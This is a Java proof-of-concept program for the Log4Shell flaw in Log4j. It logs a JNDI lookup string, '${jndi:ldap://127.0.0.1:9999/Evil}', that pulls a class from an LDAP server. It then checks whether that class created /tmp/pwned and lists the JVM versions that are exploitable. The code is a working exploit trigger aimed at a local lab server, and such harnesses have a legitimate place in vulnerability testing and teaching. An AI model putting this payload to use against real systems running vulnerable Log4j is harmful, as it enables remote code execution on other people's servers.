import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.File;

public class Main {

    private static final String PWN_FILE = "/tmp/pwned";
    private static final Logger logger = LogManager.getLogger(Main.class);

    public static void main(String[] args) throws InterruptedException {
        showJavaStats();
        logger.error("test");
        checkTmp(false);
        logger.error("Output:" + "${jndi:ldap://127.0.0.1:9999/Evil}");
        // give a beat for the file to be written
        Thread.sleep(1000);
        checkTmp(true);
    }

    public static void showJavaStats() {
        System.out.println("---------- JVM Props -------------");
        System.getProperties().entrySet().stream()
            .filter(entry -> ((String)entry.getKey()).startsWith("java.vm."))
            .forEach(System.out::println);
        System.out.println("---------------------------------");
    }

    public static void checkTmp(boolean shouldExist) {
        File f = new File(PWN_FILE);
        if (shouldExist != f.exists()) {
            String exStr = String.format(
                "\n\tUnexpected state." +
                "\n\tMake sure to remove %s between runs." +
                "\n\tMake sure Server is running." +
                "\n\tMake sure you JVM is <= 11.0.1 or 8u191 or  7u201 or 6u211",
                PWN_FILE
            );
            throw new RuntimeException(exStr);
        }
        System.out.println(String.format("%s %s", PWN_FILE, f.exists()?"EXISTS - yah been pwned!":"DOES NOT EXIST"));
    }
}